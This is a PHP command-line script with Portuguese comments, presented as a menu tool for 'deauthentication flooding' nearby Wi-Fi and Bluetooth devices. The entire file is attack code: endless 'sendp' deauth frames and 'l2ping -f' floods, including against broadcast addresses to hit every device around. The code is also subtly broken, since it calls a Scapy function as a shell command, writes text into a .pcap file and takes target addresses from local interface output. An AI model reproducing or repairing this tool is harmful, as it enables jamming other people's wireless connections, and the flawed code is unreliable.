<?php

// Função para realizar o flood de desconexão Wi-Fi
function flood_deauth_wifi($target_mac, $iface) {
    // Cria um pacote de deauth usando o endereço MAC de destino e a interface de rede
    $packet = "deauth_packet.pcap";
    file_put_contents($packet, "RadioTap()\nDot11(type=0, subtype=12, addr1='$target_mac')/Dot11Deauth()");

    // Envia o pacote continuamente
    while (true) {
        shell_exec("sudo sendp -i $iface -c 100 $packet >/dev/null 2>&1");
    }
}

// Função para realizar o flood de desconexão Bluetooth
function flood_deauth_bluetooth($target_mac) {
    // Conecta ao dispositivo Bluetooth e desconecta
    while (true) {
        shell_exec("sudo l2ping -i hci0 -f $target_mac >/dev/null 2>&1");
    }
}

// Função para exibir os dispositivos disponíveis
function exibir_dispositivos($tipo) {
    if ($tipo == "wifi") {
        echo "Dispositivos Wi-Fi:\n";
        system("sudo iw dev | awk '$1==\"Interface\"{print $2}'");
    } elseif ($tipo == "bluetooth") {
        echo "Dispositivos Bluetooth:\n";
        system("sudo hciconfig | awk '$1==\"hci\"{print $1}'");
    }
}

// Função para selecionar dispositivos específicos ou todos ao redor
function selecionar_dispositivos($tipo) {
    $dispositivos = array();
    if ($tipo == "wifi") {
        exibir_dispositivos("wifi");
        while (true) {
            $dispositivo = readline("Digite o número do dispositivo para adicionar à lista (ou 'todos' para selecionar todos): ");
            if ($dispositivo == "todos") {
                $dispositivos = array("todos");
                break;
            } elseif ($dispositivo === "") {
                echo "Número inválido. Tente novamente.\n";
            } else {
                $dispositivos[] = $dispositivo;
            }
        }
    } elseif ($tipo == "bluetooth") {
        exibir_dispositivos("bluetooth");
        while (true) {
            $dispositivo = readline("Digite o número do dispositivo para adicionar à lista (ou 'todos' para selecionar todos): ");
            if ($dispositivo == "todos") {
                $dispositivos = array("todos");
                break;
            } elseif ($dispositivo === "") {
                echo "Número inválido. Tente novamente.\n";
            } else {
                $dispositivos[] = $dispositivo;
            }
        }
    }
    return $dispositivos;
}

// Função principal
function main() {
    while (true) {
        echo "----- Menu de Flood de Desconexão -----\n";
        echo "1. Flood de Desconexão Wi-Fi\n";
        echo "2. Flood de Desconexão Bluetooth\n";
        echo "3. Flood de Desconexão Wi-Fi e Bluetooth\n";
        echo "0. Sair\n";
        $opcao = readline("Escolha uma opção: ");

        switch ($opcao) {
            case "1":
                echo "----- Opção: Flood de Desconexão Wi-Fi -----\n";
                $dispositivos = selecionar_dispositivos("wifi");
                if (count($dispositivos) === 0) {
                    echo "Nenhum dispositivo selecionado. Voltando ao menu principal.\n";
                    continue;
                }
                foreach ($dispositivos as $dispositivo) {
                    if ($dispositivo == "todos") {
                        $iface = trim(shell_exec("sudo iw dev | awk 'NR==3{print $1}'"));
                        flood_deauth_wifi("ff:ff:ff:ff:ff:ff", $iface);
                    } else {
                        $iface = trim(shell_exec("sudo iw dev | awk 'NR==$dispositivo{print $1}'"));
                        $target_mac = trim(shell_exec("sudo iw dev | awk 'NR==$dispositivo{print $2}'"));
                        flood_deauth_wifi($target_mac, $iface);
                    }
                }
                break;
            case "2":
                echo "----- Opção: Flood de Desconexão Bluetooth -----\n";
                $dispositivos = selecionar_dispositivos("bluetooth");
                if (count($dispositivos) === 0) {
                    echo "Nenhum dispositivo selecionado. Voltando ao menu principal.\n";
                    continue;
                }
                foreach ($dispositivos as $dispositivo) {
                    if ($dispositivo == "todos") {
                        flood_deauth_bluetooth("ff:ff:ff:ff:ff:ff");
                    } else {
                        $target_mac = trim(shell_exec("sudo hciconfig | awk 'NR==$dispositivo{print $2}'"));
                        flood_deauth_bluetooth($target_mac);
                    }
                }
                break;
            case "3":
                echo "----- Opção: Flood de Desconexão Wi-Fi e Bluetooth -----\n";
                $dispositivos_wifi = selecionar_dispositivos("wifi");
                $dispositivos_bluetooth = selecionar_dispositivos("bluetooth");

                if (count($dispositivos_wifi) === 0 && count($dispositivos_bluetooth) === 0) {
                    echo "Nenhum dispositivo selecionado. Voltando ao menu principal.\n";
                    continue;
                }

                foreach ($dispositivos_wifi as $dispositivo) {
                    if ($dispositivo == "todos") {
                        $iface = trim(shell_exec("sudo iw dev | awk 'NR==3{print $1}'"));
                        flood_deauth_wifi("ff:ff:ff:ff:ff:ff", $iface);
                    } else {
                        $iface = trim(shell_exec("sudo iw dev | awk 'NR==$dispositivo{print $1}'"));
                        $target_mac = trim(shell_exec("sudo iw dev | awk 'NR==$dispositivo{print $2}'"));
                        flood_deauth_wifi($target_mac, $iface);
                    }
                }

                foreach ($dispositivos_bluetooth as $dispositivo) {
                    if ($dispositivo == "todos") {
                        flood_deauth_bluetooth("ff:ff:ff:ff:ff:ff");
                    } else {
                        $target_mac = trim(shell_exec("sudo hciconfig | awk 'NR==$dispositivo{print $2}'"));
                        flood_deauth_bluetooth($target_mac);
                    }
                }
                break;
            case "0":
                echo "Encerrando o programa...\n";
                exit(0);
            default:
                echo "Opção inválida. Por favor, escolha uma opção válida.\n";
        }
    }
}

// Executa a função principal
main();

?>
